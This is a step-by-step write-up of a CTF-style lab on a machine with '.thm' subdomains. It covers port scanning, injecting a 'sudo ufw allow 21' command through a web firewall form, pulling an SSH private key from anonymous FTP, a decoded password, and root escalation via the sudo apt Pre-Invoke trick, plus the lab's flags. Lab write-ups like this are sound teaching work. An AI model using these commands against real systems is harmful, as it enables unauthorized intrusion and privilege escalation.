Objective

The goal of this CTF-style lab was to access the target machine 10.10.54.237, enumerate services, exploit an exposed FTP server, pivot via stolen credentials, and escalate to root using a known sudo privilege escalation trick. Everything was done manually and step-by-step.

Stage 1: Initial Nmap Scan (Reconnaissance)

I started with a full TCP port scan:

nmap -p- -T4 10.10.54.237

Results:

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

This showed three open ports. FTP (21) was not accessible yet.

Stage 2: Domain Discovery

Through DNS enumeration and hints in /etc/hosts, I identified several subdomains:

dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm

I added them to /etc/hosts:

echo "10.10.54.237 dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm" >> /etc/hosts

Stage 3: Accessing Web Server (HTTPS)

Using curl, I checked the endpoint:

curl -kIL https://netops-dev.dodge.thm

JS Files Found:

cf.js

firewall.js

I downloaded and inspected them:

curl -k https://netops-dev.dodge.thm/cf.js -o cf.js
curl -k https://netops-dev.dodge.thm/firewall.js -o firewall.js

The JavaScript made requests to a page called firewall10110.php, suggesting a web-based firewall configuration interface.

Stage 4: Firewall Bypass

Using the form handler firewall10110.php, I attempted to modify UFW rules:

curl -k -X POST https://netops-dev.dodge.thm/firewall10110.php \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d 'command=sudo ufw allow 21'

Response indicated the rule was updated. I confirmed FTP (port 21) was now open:

nmap -p 21 10.10.54.237

Stage 5: FTP Enumeration

ftp 10.10.54.237

Login as:

Name: anonymous
Password: [enter]

binary
ls -la
cd .ssh
ls -la
get id_rsa_backup
get authorized_keys

Downloaded id_rsa_backup, which was 2610 bytes (likely a private SSH key).

Stage 6: SSH Access as challenger

chmod 600 id_rsa_backup
ssh -i id_rsa_backup challenger@10.10.54.237

Login successful 

Stage 7: Capturing User Flag

cat ~/user.txt

Flag:

THM{0649b2285e507b38b10620e57f9c861}

Stage 8: Analyzing Web Code

cat /var/www/notes/api/posts.php

Found a base64-encoded string. Decoded:

echo '<base64>' | base64 -d

Discovered credentials:

cobra / mz4%o7BGum#TTu

Stage 9: Switching to cobra

su cobra
Password: mz4%o7BGum#TTu

Checked sudo privileges:

sudo -l

Output:

(ALL) NOPASSWD: /usr/bin/apt

Stage 10: Privilege Escalation to Root

Used GTFOBins technique:

sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh

Got root shell 

whoami
# root

Stage 11: Root Flag

cd /root
cat root.txt

Flag:

THM{7b88ac4f52cd8723a8d0c632c2d930ba}

Summary Table

Access Level

Method

challenger

Retrieved SSH key via FTP

cobra

Password from decoded base64 in PHP file

root

sudo apt with APT::Update::Pre-Invoke shell

Conclusion 

This project was fully executed from my attacking machine (10.10.75.59) and allowed me to:

Bypass a firewall by injecting ufw rules

Recover sensitive private keys from anonymous FTP

Decode base64 secrets in web source

Privilege escalate to root using a documented sudo trick (GTFOBins)

It improved my hands-on understanding of firewall misconfigurations, Linux permissions, SSH authentication, and web-based enumeration. All steps were documented for learning and reproducibility.

